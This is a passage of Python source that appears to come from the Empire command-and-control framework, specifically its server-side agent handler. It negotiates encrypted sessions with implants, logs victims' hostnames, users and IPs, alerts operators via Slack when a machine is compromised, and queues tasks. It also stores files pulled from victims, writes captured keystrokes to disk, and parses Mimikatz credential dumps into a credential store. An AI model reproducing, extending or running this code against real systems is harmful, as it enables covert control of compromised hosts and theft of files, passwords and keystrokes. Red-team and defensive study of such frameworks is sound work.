                        # add the agent to the database now that it's "checked in"
                        self.mainMenu.agents.add_agent(sessionID, clientIP, delay, jitter, profile, killDate, workingHours, lostLimit, nonce=nonce, listener=listenerName)

                        if self.mainMenu.socketio:
                            self.mainMenu.socketio.emit('agents/new', self.get_agent_for_socket(sessionID),
                                                        broadcast=True)

                        clientSessionKey = self.mainMenu.agents.get_agent_session_key_db(sessionID)
                        data = "%s%s" % (nonce, clientSessionKey)

                        data = data.encode('ascii', 'ignore') # TODO: is this needed?

                        # step 4 of negotiation -> server returns RSA(nonce+AESsession))
                        encryptedMsg = encryption.rsa_encrypt(rsaKey, data)
                        # TODO: wrap this in a routing packet!

                        return encryptedMsg

                    else:
                        message = "[!] Agent {} returned an invalid PowerShell public key!".format(sessionID)
                        signal = json.dumps({
                            'print': True,
                            'message': message
                        })
                        dispatcher.send(signal, sender="agents/{}".format(sessionID))
                        return 'ERROR: Invalid PowerShell public key'

            elif language.lower() == 'python':
                if ((len(message) < 1000) or (len(message) > 2500)):
                    message = "[!] Invalid Python key post format from {}".format(sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    return "Error: Invalid Python key post format from %s" % (sessionID)
                else:
                    try:
                        int(message)
                    except:
                        message = "[!] Invalid Python key post format from {}".format(sessionID)
                        signal = json.dumps({
                            'print': True,
                            'message': message
                        })
                        dispatcher.send(signal, sender="agents/{}".format(sessionID))
                        return "Error: Invalid Python key post format from {}".format(sessionID)

                    # client posts PUBc key
                    clientPub = int(message)
                    serverPub = encryption.DiffieHellman()
                    serverPub.genKey(clientPub)
                    # serverPub.key == the negotiated session key

                    nonce = helpers.random_string(16, charset=string.digits)

                    message = "[*] Agent {} from {} posted valid Python PUB key".format(sessionID, clientIP)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))

                    delay = listenerOptions['DefaultDelay']['Value']
                    jitter = listenerOptions['DefaultJitter']['Value']
                    profile = listenerOptions['DefaultProfile']['Value']
                    killDate = listenerOptions['KillDate']['Value']
                    workingHours = listenerOptions['WorkingHours']['Value']
                    lostLimit = listenerOptions['DefaultLostLimit']['Value']

                    # add the agent to the database now that it's "checked in"
                    self.mainMenu.agents.add_agent(sessionID, clientIP, delay, jitter, profile, killDate, workingHours, lostLimit, sessionKey=serverPub.key, nonce=nonce, listener=listenerName)

                    if self.mainMenu.socketio:
                        self.mainMenu.socketio.emit('agents/new', self.get_agent_for_socket(sessionID),
                                                    broadcast=True)

                    # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
                    data = "%s%s" % (nonce, serverPub.publicKey)
                    encryptedMsg = encryption.aes_encrypt_then_hmac(stagingKey, data)
                    # TODO: wrap this in a routing packet?

                    return encryptedMsg

            else:
                message = "[*] Agent {} from {} using an invalid language specification: {}".format(sessionID, clientIP, language)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return 'ERROR: invalid language: {}'.format(language)

        elif meta == 'STAGE2':
            # step 5 of negotiation -> client posts nonce+sysinfo and requests agent

            sessionKey = (self.agents[sessionID]['sessionKey'])
            if isinstance(sessionKey, str):
                sessionKey = (self.agents[sessionID]['sessionKey']).encode('UTF-8')

            try:
                message = encryption.aes_decrypt_and_verify(sessionKey, encData)
                parts = message.split(b'|')

                if len(parts) < 12:
                    message = "[!] Agent {} posted invalid sysinfo checkin format: {}".format(sessionID, message)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    # remove the agent from the cache/database
                    self.mainMenu.agents.remove_agent_db(sessionID)
                    return "ERROR: Agent %s posted invalid sysinfo checkin format: %s" % (sessionID, message)

                # verify the nonce
                if int(parts[0]) != (int(self.mainMenu.agents.get_agent_nonce_db(sessionID)) + 1):
                    message = "[!] Invalid nonce returned from {}".format(sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    # remove the agent from the cache/database
                    self.mainMenu.agents.remove_agent_db(sessionID)
                    return "ERROR: Invalid nonce returned from %s" % (sessionID)

                message = "[!] Nonce verified: agent {} posted valid sysinfo checkin format: {}".format(sessionID, message)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                listener = str(parts[1], 'utf-8')
                domainname = str(parts[2], 'utf-8')
                username = str(parts[3], 'utf-8')
                hostname = str(parts[4], 'utf-8')
                external_ip = clientIP
                internal_ip = str(parts[5], 'utf-8')
                os_details = str(parts[6], 'utf-8')
                high_integrity = str(parts[7], 'utf-8')
                process_name = str(parts[8], 'utf-8')
                process_id = str(parts[9], 'utf-8')
                language = str(parts[10], 'utf-8')
                language_version = str(parts[11], 'utf-8')
                if high_integrity == "True":
                    high_integrity = 1
                else:
                    high_integrity = 0

            except Exception as e:
                message = "[!] Exception in agents.handle_agent_staging() for {} : {}".format(sessionID, e)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                # remove the agent from the cache/database
                self.mainMenu.agents.remove_agent_db(sessionID)
                return "Error: Exception in agents.handle_agent_staging() for %s : %s" % (sessionID, e)

            if domainname and domainname.strip() != '':
                username = "%s\\%s" % (domainname, username)

            # update the agent with this new information
            self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listenerName, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, language_version=language_version, language=language)

            # signal to Slack that this agent is now active

            slack_webhook_url = listenerOptions['SlackURL']['Value']
            if slack_webhook_url != "":
                slack_text = ":biohazard_sign: NEW AGENT :biohazard_sign:\r\n```Machine Name: %s\r\nInternal IP: %s\r\nExternal IP: %s\r\nUser: %s\r\nOS Version: %s\r\nAgent ID: %s```" % (hostname,internal_ip,external_ip,username,os_details,sessionID)
                helpers.slackMessage(slack_webhook_url,slack_text)

            # signal everyone that this agent is now active
            message = "[+] Initial agent {} from {} now active (Slack)".format(sessionID, clientIP)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # save the initial sysinfo information in the agent log
            agent = self.mainMenu.agents.get_agent_db(sessionID)

            lastseen_time = datetime.fromisoformat(agent['lastseen_time']).astimezone(timezone.utc)
            stale = helpers.is_stale(lastseen_time, agent['delay'], agent['jitter'])
            agent['stale'] = stale
            if self.mainMenu.socketio:
                self.mainMenu.socketio.emit('agents/stage2', agent, broadcast=True)

            output = messages.display_agent(agent, returnAsString=True)
            output += "\n[+] Agent %s now active:\n" % (sessionID)
            self.mainMenu.agents.save_agent_log(sessionID, output)

            # if a script autorun is set, set that as the agent's first tasking
            autorun = self.get_autoruns_db()
            if autorun and autorun[0] != '' and autorun[1] != '':
                self.add_agent_task_db(sessionID, autorun[0], autorun[1])

            if language.lower() in self.mainMenu.autoRuns and len(self.mainMenu.autoRuns[language.lower()]) > 0:
                autorunCmds = ["interact %s" % sessionID]
                autorunCmds.extend(self.mainMenu.autoRuns[language.lower()])
                autorunCmds.extend(["lastautoruncmd"])
                self.mainMenu.resourceQueue.extend(autorunCmds)
                try:
                    #this will cause the cmdloop() to start processing the autoruns
                    self.mainMenu.do_agents("kickit")
                except Exception as e:
                    if e == "endautorun":
                        pass
                    else:
                        print(helpers.color("[!] End of Autorun Queue" ))

            return "STAGE2: %s" % (sessionID)

        else:
            message = "[!] Invalid staging request packet from {} at {} : {}".format(sessionID, clientIP, meta)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

    def handle_agent_data(self, stagingKey, routingPacket, listenerOptions, clientIP='0.0.0.0', update_lastseen=True):
        """
        Take the routing packet w/ raw encrypted data from an agent and
        process as appropriately.

        Abstracted out sufficiently for any listener module to use.
        """
        if len(routingPacket) < 20:
            message = "[!] handle_agent_data(): routingPacket wrong length: {}".format(len(routingPacket))
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="empire")
            return None

        if isinstance(routingPacket, str):
            routingPacket = routingPacket.encode('UTF-8')
        routingPacket = packets.parse_routing_packet(stagingKey, routingPacket)
        if not routingPacket:
            return [('', "ERROR: invalid routing packet")]

        dataToReturn = []

        # process each routing packet
        for sessionID, (language, meta, additional, encData) in routingPacket.items():
            if meta == 'STAGE0' or meta == 'STAGE1' or meta == 'STAGE2':
                message = "[*] handle_agent_data(): sessionID {} issued a {} request".format(sessionID, meta)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append((language, self.handle_agent_staging(sessionID, language, meta, additional, encData, stagingKey, listenerOptions, clientIP)))

            elif sessionID not in self.agents:
                message = "[!] handle_agent_data(): sessionID {} not present".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append(('', "ERROR: sessionID %s not in cache!" % (sessionID)))

            elif meta == 'TASKING_REQUEST':
                message = "[*] handle_agent_data(): sessionID {} issued a TASKING_REQUEST".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append((language, self.handle_agent_request(sessionID, language, stagingKey)))

            elif meta == 'RESULT_POST':
                message = "[*] handle_agent_data(): sessionID {} issued a RESULT_POST".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append((language, self.handle_agent_response(sessionID, encData, update_lastseen)))

            else:
                message = "[!] handle_agent_data(): sessionID {} gave unhandled meta tag in routing packet: {}".format(sessionID, meta)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
        return dataToReturn


    def handle_agent_request(self, sessionID, language, stagingKey, update_lastseen=True):
        """
        Update the agent's last seen time and return any encrypted taskings.

        TODO: does this need self.lock?
        """
        if sessionID not in self.agents:
            message = "[!] handle_agent_request(): sessionID {} not present".format(sessionID)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))
            return None

        # update the client's last seen time
        if update_lastseen:
            self.update_agent_lastseen_db(sessionID)

        # retrieve all agent taskings from the cache
        taskings = self.get_agent_tasks_db(sessionID)

        if taskings and taskings != []:

            all_task_packets = b''

            # build tasking packets for everything we have
            for tasking in taskings:
                task_name, task_data, res_id = tasking

                all_task_packets += packets.build_task_packet(task_name, task_data, res_id)

            # get the session key for the agent
            session_key = self.agents[sessionID]['sessionKey']

            # encrypt the tasking packets with the agent's session key
            encrypted_data = encryption.aes_encrypt_then_hmac(session_key, all_task_packets)

            return packets.build_routing_packet(stagingKey, sessionID, language, meta='SERVER_RESPONSE', encData=encrypted_data)

        # if no tasking for the agent
        else:
            return None


    def handle_agent_response(self, sessionID, encData, update_lastseen=False):
        """
        Takes a sessionID and posted encrypted data response, decrypt
        everything and handle results as appropriate.

        TODO: does this need self.lock?
        """

        if sessionID not in self.agents:
            message = "[!] handle_agent_response(): sessionID {} not in cache".format(sessionID)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))
            return None

        # extract the agent's session key
        sessionKey = self.agents[sessionID]['sessionKey']

        # update the client's last seen time
        if update_lastseen:
            self.update_agent_lastseen_db(sessionID)

        try:
            # verify, decrypt and depad the packet
            packet = encryption.aes_decrypt_and_verify(sessionKey, encData)

            # process the packet and extract necessary data
            responsePackets = packets.parse_result_packets(packet)
            results = False
            # process each result packet
            for (responseName, totalPacket, packetNum, taskID, length, data) in responsePackets:
                # process the agent's response
                self.process_agent_packet(sessionID, responseName, taskID, data)
                results = True
            if results:
                # signal that this agent returned results
                message = "[*] Agent {} returned results.".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # return a 200/valid
            return 'VALID'


        except Exception as e:
            message = "[!] Error processing result packet from {} : {}".format(sessionID, e)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # TODO: stupid concurrency...
            #   when an exception is thrown, something causes the lock to remain locked...
            # if self.lock.locked():
            #     self.lock.release()
            return None


    def process_agent_packet(self, sessionID, responseName, taskID, data):
        """
        Handle the result packet based on sessionID and responseName.
        """

        agentSessionID = sessionID
        keyLogTaskID = None

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            # report the agent result in the reporting database
            cur = conn.cursor()
            message = "[*] Agent {} got results".format(sessionID)
            signal = json.dumps({
                'print': False,
                'message': message,
                'response_name': responseName,
                'task_id': taskID,
                'event_type': 'result'
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # insert task results into the database, if it's not a file
            if taskID != 0 and responseName not in ["TASK_DOWNLOAD", "TASK_CMD_JOB_SAVE", "TASK_CMD_WAIT_SAVE"] and data != None:
                # Update result with data
                cur.execute("UPDATE results SET data=? WHERE id=? AND agent=?", (data, taskID, sessionID))
                # self.mainMenu.socketio.emit('agents/task', {'sessionID': sessionID, 'taskID': taskID, 'data': data})

                try:
                    keyLogTaskID = cur.execute("SELECT id FROM taskings WHERE agent=? AND id=? AND data LIKE \"function Get-Keystrokes%\"", [sessionID, taskID]).fetchone()[0]
                except Exception as e:
                    pass
                else:
                    cur.execute("UPDATE results SET data=data||? WHERE id=? AND agent=?", [data, taskID, sessionID])

        finally:
            cur.close()
            self.lock.release()

        # TODO: for heavy traffic packets, check these first (i.e. SOCKS?)
        #       so this logic is skipped

        if responseName == "ERROR":
            # error code
            message = "\n[!] Received error response from {}".format(sessionID)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))
            self.update_agent_results_db(sessionID, data)

            if isinstance(data,bytes):
                data = data.decode('UTF-8')
            # update the agent log
            self.save_agent_log(sessionID, "[!] Error response: " + data)


        elif responseName == "TASK_SYSINFO":
            # sys info response -> update the host info
            data = data.decode('utf-8')
            parts = data.split("|")
            if len(parts) < 12:
                message = "[!] Invalid sysinfo response from {}".format(sessionID)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
            else:
                # extract appropriate system information
                listener = parts[1]
                domainname = parts[2]
                username = parts[3]
                hostname = parts[4]
                internal_ip = parts[5]
                os_details = parts[6]
                high_integrity = parts[7]
                process_name = parts[8]
                process_id = parts[9]
                language = parts[10]
                language_version = parts[11]
                if high_integrity == 'True':
                    high_integrity = 1
                else:
                    high_integrity = 0

                # username = str(domainname)+"\\"+str(username)
                username = "%s\\%s" % (domainname, username)

                # update the agent with this new information
                self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listener, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, language_version=language_version, language=language)

                sysinfo = '{0: <18}'.format("Listener:") + listener + "\n"
                sysinfo += '{0: <18}'.format("Internal IP:") + internal_ip + "\n"
                sysinfo += '{0: <18}'.format("Username:") + username + "\n"
                sysinfo += '{0: <18}'.format("Hostname:") + hostname + "\n"
                sysinfo += '{0: <18}'.format("OS:") + os_details + "\n"
                sysinfo += '{0: <18}'.format("High Integrity:") + str(high_integrity) + "\n"
                sysinfo += '{0: <18}'.format("Process Name:") + process_name + "\n"
                sysinfo += '{0: <18}'.format("Process ID:") + process_id + "\n"
                sysinfo += '{0: <18}'.format("Language:") + language + "\n"
                sysinfo += '{0: <18}'.format("Language Version:") + language_version + "\n"

                self.update_agent_results_db(sessionID, sysinfo)
                # update the agent log
                self.save_agent_log(sessionID, sysinfo)


        elif responseName == "TASK_EXIT":
            # exit command response
            # let everyone know this agent exited
            message = "[!] Agent {} exiting".format(sessionID)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # update the agent results and log
            # self.update_agent_results(sessionID, data)
            self.save_agent_log(sessionID, data)

            # remove this agent from the cache/database
            self.remove_agent_db(sessionID)


        elif responseName == "TASK_SHELL":
            # shell command response
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_DOWNLOAD":
            # file download
            if isinstance(data, bytes):
                data = data.decode('UTF-8')

            parts = data.split("|")
            if len(parts) != 4:
                message = "[!] Received invalid file download response from {}".format(sessionID)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
            else:
                index, path, filesize, data = parts
                # decode the file data and save it off as appropriate
                file_data = helpers.decode_base64(data.encode('UTF-8'))
                name = self.get_agent_name_db(sessionID)

                if index == "0":
                    self.save_file(name, path, file_data, filesize)
                else:
                    self.save_file(name, path, file_data, filesize, append=True)
                # update the agent log
                msg = "file download: %s, part: %s" % (path, index)
                self.save_agent_log(sessionID, msg)

        elif responseName == "TASK_DIR_LIST":
            try:
                result = json.loads(data.decode('utf-8'))
                self.update_dir_list(sessionID, result)
            except ValueError as e:
                pass

            self.update_agent_results_db(sessionID, data)
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_GETDOWNLOADS":
            if not data or data.strip().strip() == "":
                data = "[*] No active downloads"

            self.update_agent_results_db(sessionID, data)
            #update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_STOPDOWNLOAD":
            # download kill response
            self.update_agent_results_db(sessionID, data)
            #update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_UPLOAD":
            pass


        elif responseName == "TASK_GETJOBS":

            if not data or data.strip().strip() == "":
                data = "[*] No active jobs"

            # running jobs
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_STOPJOB":
            # job kill response
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT":

            # dynamic script output -> blocking
            self.update_agent_results_db(sessionID, data)

            # see if there are any credentials to parse
            time = helpers.get_datetime()
            creds = helpers.parse_credentials(data)

            if creds:
                for cred in creds:

                    hostname = cred[4]

                    if hostname == "":
                        hostname = self.get_agent_hostname_db(sessionID)

                    osDetails = self.get_agent_os_db(sessionID)

                    self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, osDetails, cred[5], time)

            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT_SAVE":

            # dynamic script output -> blocking, save data
            name = self.get_agent_name_db(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip().decode('UTF-8')
            extension = data[15:20].strip().decode('UTF-8')
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (prefix, self.get_agent_hostname_db(sessionID), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "Output saved to .%s" % (final_save_path)
            self.update_agent_results_db(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_CMD_JOB":
        #check if this is the powershell keylogging task, if so, write output to file instead of screen
            if keyLogTaskID and keyLogTaskID == taskID:
                safePath = os.path.abspath("%sdownloads/" % self.mainMenu.installPath)
                savePath = "%sdownloads/%s/keystrokes.txt" % (self.mainMenu.installPath,sessionID)
                if not os.path.abspath(savePath).startswith(safePath):
                    message = "[!] WARNING: agent {} attempted skywalker exploit!".format(self.sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(self.sessionID))
                    return

                with open(savePath,"a+") as f:
                    if isinstance(data, bytes):
                        data = data.decode('UTF-8')
                    new_results = data.replace("\r\n","").replace("[SpaceBar]", "").replace('\b', '').replace("[Shift]", "").replace("[Enter]\r","\r\n")
                    f.write(new_results)
            else:
                # dynamic script output -> non-blocking
                self.update_agent_results_db(sessionID, data)

                # update the agent log
                self.save_agent_log(sessionID, data)

            # TODO: redo this regex for really large AD dumps
            #   so a ton of data isn't kept in memory...?
            if isinstance(data,str):
                data = data.encode("UTF-8")
            parts = data.split(b"\n")
            if len(parts) > 10:
                time = helpers.get_datetime()
                if parts[0].startswith(b"Hostname:"):
                    # if we get Invoke-Mimikatz output, try to parse it and add
                    #   it to the internal credential store

                    # cred format: (credType, domain, username, password, hostname, sid, notes)
                    creds = helpers.parse_mimikatz(data)

                    for cred in creds:
                        hostname = cred[4]

                        if hostname == "":
                            hostname = self.get_agent_hostname_db(sessionID)

                        osDetails = self.get_agent_os_db(sessionID)

                        self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, osDetails, cred[5], time)


        elif responseName == "TASK_CMD_JOB_SAVE":
            # dynamic script output -> non-blocking, save data
            name = self.get_agent_name_db(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (prefix, self.get_agent_hostname_db(sessionID), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "Output saved to .%s" % (final_save_path)
            self.update_agent_results_db(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_SCRIPT_IMPORT":
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_IMPORT_MODULE":
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_VIEW_MODULE":
            self.update_agent_results_db(sessionID, data)
            #update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_REMOVE_MODULE":
            self.update_agent_results_db(sessionID, data)
            #update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_SCRIPT_COMMAND":

            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_SWITCH_LISTENER":
            # update the agent listener
            if isinstance(data, bytes):
                data = data.decode('UTF-8')

            listener_name = data[38:]

            self.update_agent_listener_db(sessionID, listener_name)
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)
            message = "[+] Updated comms for {} to {}".format(sessionID, listener_name)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

        elif responseName == "TASK_UPDATE_LISTENERNAME":
            # The agent listener name variable has been updated agent side
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)
            message = "[+] Listener for '{}' updated to '{}'".format(sessionID, data)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

        else:
            print(helpers.color("[!] Unknown response %s from %s" % (responseName, sessionID)))
